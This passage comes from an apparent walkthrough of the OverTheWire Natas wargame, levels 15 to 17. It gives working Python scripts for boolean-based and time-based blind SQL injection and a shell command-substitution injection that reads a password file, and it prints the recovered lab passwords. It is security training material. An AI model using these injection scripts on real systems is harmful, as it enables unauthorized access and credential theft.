<p>So, this time the SQL code checks for the existence of a user and reports whether that username exists or not. We can&rsquo;t inject in a way that would directly give us the password like previously, but we know the query will be run against the <em>users</em> table, which contains both usernames and passwords. There is a way to bruteforce the natas16 password by forcing the database to check it one character at a time and report True of False (user exists or not). The statement to inject will look like this: <code>username=natas16" AND password LIKE BINARY &ldquo;a%&rdquo;&mdash; </code>. Testing it in the URL (don&rsquo;t forget to encode the space after comments), you can check one character a time until the database respons with the user exists message. Then you know the password begins with the respective character and you can move on to the next. But the password is 32 characters long, so we will do it in an automated way!</p>

<p>Some explanation about the SQL keywords:</p>

<ul>
<li><p>The AND operator displays a record if both the first condition AND the second condition are true.</p></li>
<li><p>The LIKE operator is used in a WHERE clause to search for a specified pattern in a column.</p></li>
<li><p>The BINARY operator casts the string following it to a binary string. This is an easy way to force a column comparison to be done byte by byte rather than character by character. This causes the comparison to be case sensitive even if the column is not defined as BINARY or BLOB. BINARY also causes trailing spaces to be significant.</p></li>
<li><p><strong>%</strong>     A substitute for zero or more characters</p></li>
</ul>


<p>If you run this query with the debug parameter set, you will see how it looks like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Executing query: SELECT * from users where username="natas16"and password like binary "a%"-- "</span></code></pre></td></tr></table></div></figure>


<p>When the entire statement is evaluated, the query will return True of False, and we will use that information to build the password. Here&rsquo;s a Python script to do the job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="c"># this is the range of possible values</span>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">testchars</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># binary keyword forces a case sensitive search</span>
</span><span class='line'>    <span class="n">query</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s">&quot;natas16</span><span class="se">\&quot;</span><span class="s"> AND password like BINARY </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> \
</span><span class='line'>                 <span class="n">passwd</span> <span class="o">+</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="s">&quot;%</span><span class="se">\&quot;</span><span class="s"> -- &quot;</span><span class="p">,</span><span class="n">submit</span><span class="o">=</span><span class="s">&quot;Check existence&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># example query: {&#39;username&#39;: &#39;natas16&quot; AND password like BINARY &quot; a%&quot; -- &#39;}</span>
</span><span class='line'>    <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas15.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                      <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas15&#39;</span><span class="p">,</span> <span class="s">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span class="p">),</span>\
</span><span class='line'>                      <span class="n">params</span> <span class="o">=</span> <span class="n">query</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># example encoded query (automatic encoding):</span>
</span><span class='line'>    <span class="c"># username=natas16%22+AND+password+like+BINARY+%22+a%25%22+--+</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&quot;This user exists&quot;</span> <span class="ow">in</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">passwd</span> <span class="o">+=</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure>


<p>The passwod will be slowly built like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>W
</span><span class='line'>Wa
</span><span class='line'>WaI
</span><span class='line'>WaIH
</span><span class='line'>WaIHE
</span><span class='line'>WaIHEa
</span><span class='line'>WaIHEac
</span><span class='line'>WaIHEacj
</span><span class='line'>WaIHEacj6
</span><span class='line'>WaIHEacj63
</span><span class='line'>WaIHEacj63w
</span><span class='line'>WaIHEacj63wn
</span><span class='line'>WaIHEacj63wnN
</span><span class='line'>WaIHEacj63wnNI
</span><span class='line'>WaIHEacj63wnNIB
</span><span class='line'>WaIHEacj63wnNIBR
</span><span class='line'>WaIHEacj63wnNIBRO
</span><span class='line'>WaIHEacj63wnNIBROH
</span><span class='line'>WaIHEacj63wnNIBROHe
</span><span class='line'>WaIHEacj63wnNIBROHeq
</span><span class='line'>WaIHEacj63wnNIBROHeqi
</span><span class='line'>WaIHEacj63wnNIBROHeqi3
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5n
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nh
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nhm
</span><span class='line'>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span></code></pre></td></tr></table></div></figure>


<p>And now we have the password for natas16: <code>WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</code></p>

<h3>Level 16</h3>

<p><img class="center" src="/images/overthewire/natas/natas16.png" title="natas16" alt="natas 16"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nv">$key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;needle&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;needle&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[;|&amp;`\&#39;&quot;]/&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">print</span> <span class="s2">&quot;Input contains an illegal character!&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i </span><span class="se">\&quot;</span><span class="si">$key</span><span class="se">\&quot;</span><span class="s2"> dictionary.txt&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, this is similar to level 9. This time, however, there is character filtering in place, so we can&rsquo;t use any of these: <code>;|&amp;`\&lsquo;&ldquo;</code>. So there is no way to inject or chain commands..at the first glance! There is one useful character that is not filtered! The dollar sign! This is used in the bash shell in the same way as the backticks: for <a href="http://bash.cyberciti.biz/guide/Command_substitution">command substitution</a></p>

<p>Basically, you can use it to run a command and store its output in a variable or display it with the <em>echo</em> command. It looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# echo $(whoami)
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>So we want to bruteforce the password in the way we did before. Whatever we run with the $() command will be placed inside the $key variable, which is passed to grep against the dictionary file. If there is a match, the words containing it are displayed, else nothing is displayed. This is the behavior we will exploit for True and False values with our injection</p>

<p>Let&rsquo;s test it first. In the form field, I injected <code>$(echo matrix)</code>, and that return all the matches for that word:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Output:
</span><span class='line'>
</span><span class='line'>matrix
</span><span class='line'>matrix's
</span><span class='line'>matrixes</span></code></pre></td></tr></table></div></figure>


<p>The code executed by the server ends up being <code>grep -i matrix dictionary.txt</code>. Now, if I inject a non-existent word, there is no output. So to check for the password, we will use a nested grep inside the main grep, that will look like this: <code>$(grep -E ^a.* /etc/natas_webpass/natas17)matrix</code>. This checks if the password starts with a, and we will then iterate over all characters. Let&rsquo;s imagine what happens if a is the first character of the password:</p>

<ul>
<li><p>the nested grep that we injected returns a, which is appended to the word we passed after, matrix in this case, so the server-side grep looks for the word amatrix in the dictionary file, and since that doesn&rsquo;t exist, nothing is returned. So we know that if nothing is returned, we had a match</p></li>
<li><p>there is no match for the nested grep, so the matrix word remains unchanged, and the server returns all the matrix words, which means there was no match for the character we tried in the password</p></li>
</ul>


<p>To automate the injection process, I wrote a Python script again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">testchars</span><span class="p">:</span>
</span><span class='line'>            <span class="n">passwd</span> <span class="o">+=</span> <span class="n">char</span>
</span><span class='line'>            <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;needle&#39;</span><span class="p">:</span> <span class="s">&quot;$(grep -E ^&quot;</span> <span class="o">+</span> <span class="n">passwd</span> <span class="o">+</span> <span class="s">&quot;.* /etc/natas_webpass/natas17)matrix&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Search&#39;</span><span class="p">}</span>
</span><span class='line'>            <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas16.natas.labs.overthewire.org/?needle=&#39;</span><span class="p">,</span>
</span><span class='line'>                                 <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas16&#39;</span><span class="p">,</span> <span class="s">&#39;WaIHEacj63wnNIBROHeqi3p9t0m5nhmh&#39;</span><span class="p">),</span>
</span><span class='line'>                                 <span class="n">params</span> <span class="o">=</span> <span class="n">payload</span><span class="p">)</span>
</span><span class='line'>            <span class="n">response</span> <span class="o">=</span> <span class="n">guess</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;Trying: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>            <span class="k">if</span> <span class="s">&quot;matrix&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="s">&quot;Password: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>                <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>                <span class="k">break</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="c"># keep the chars that matched</span>
</span><span class='line'>                <span class="n">passwd</span> <span class="o">=</span> <span class="n">passwd</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Done! Password: &quot;</span><span class="p">,</span> <span class="n">passwd</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Password:  8
</span><span class='line'>Password:  8P
</span><span class='line'>Password:  8Ps
</span><span class='line'>Password:  8Ps3
</span><span class='line'>Password:  8Ps3H
</span><span class='line'>Password:  8Ps3H0
</span><span class='line'>Password:  8Ps3H0G
</span><span class='line'>Password:  8Ps3H0GW
</span><span class='line'>Password:  8Ps3H0GWb
</span><span class='line'>Password:  8Ps3H0GWbn
</span><span class='line'>Password:  8Ps3H0GWbn5
</span><span class='line'>Password:  8Ps3H0GWbn5r
</span><span class='line'>Password:  8Ps3H0GWbn5rd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7G
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7Gm
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmA
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdg
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQ
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQN
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNd
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdk
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkh
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhP
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
</span><span class='line'>Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
</span><span class='line'>Done! Password:  8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</span></code></pre></td></tr></table></div></figure>


<p>Cool, we have the password for the next level: <code>8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw</code></p>

<h3>Level 17</h3>

<p><img class="center" src="/images/overthewire/natas/natas15.png" title="natas17" alt="natas 17"></p>

<p>Again, a level similar to a previous one. This will be another case of SQL injection:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas17&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">echo</span> <span class="s2">&quot;Executing query: </span><span class="si">$query</span><span class="s2">&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;This user exists.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;This user doesn&#39;t exist.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//echo &quot;Error in query.&lt;br&gt;&quot;;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>We know the database is vulnerable, but nothing is displayed to the screen, because the <em>echo</em> statements are commented out. So we&rsquo;re going in blind! To determine if the database returns True or False to our query, we can use time-based SQL injection, by making the database load longer if our query is true, and normal if not. I tested it with this injection string: <code>natas18" AND SLEEP(5)&mdash; </code>. As expected, since the user natas18 exists, the page took 5 seconds to load. When the username didn&rsquo;t exist, it loaded instantly. So the sleep function is executed if the previous part of the query was true, but not if it&rsquo;s false. With this in mind, I modified the Python script I used before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'><span class="n">passwd</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">testchars</span> <span class="o">=</span> <span class="s">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">testchars</span><span class="p">):</span>
</span><span class='line'>    <span class="n">query</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;username&#39;</span><span class="p">:</span> <span class="s">&#39;natas18&quot; and password like binary &#39;</span> <span class="o">+</span> <span class="s">&#39;&quot;&#39;</span> <span class="o">+</span> <span class="n">passwd</span> <span class="o">+</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">+</span> <span class="s">&#39;%&quot; &#39;</span> <span class="o">+</span> <span class="s">&#39;and sleep(15)-- &#39;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Check existence&#39;</span><span class="p">}</span>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">guess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">&#39;http://natas17.natas.labs.overthewire.org/&#39;</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">auth</span> <span class="o">=</span> <span class="p">(</span><span class="s">&#39;natas17&#39;</span><span class="p">,</span> <span class="s">&#39;8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw&#39;</span><span class="p">),</span>\
</span><span class='line'>                          <span class="n">params</span> <span class="o">=</span> <span class="n">query</span><span class="p">,</span> \
</span><span class='line'>                          <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span> <span class="c"># how many seconds to wait for a response</span>
</span><span class='line'>    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span><span class='line'>        <span class="n">passwd</span> <span class="o">+=</span> <span class="n">testchars</span><span class="p">[</span><span class="n">index</span><span class="p">]</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;Password: &#39;</span><span class="p">,</span> <span class="n">passwd</span>
</span><span class='line'>        <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;Done! Password is &#39;</span><span class="p">,</span> <span class="n">passwd</span>
</span></code></pre></td></tr></table></div></figure>


<p>This took long because I had to use higher values for sleep() and timeout..the script kept stopping early with shorter times. Anyway, skipping the build-up output, the passwod is <code>xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP</code></p>

<h3>Level 18</h3>

<p><img class="center" src="/images/overthewire/natas/natas18.png" title="natas18" alt="natas 18"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
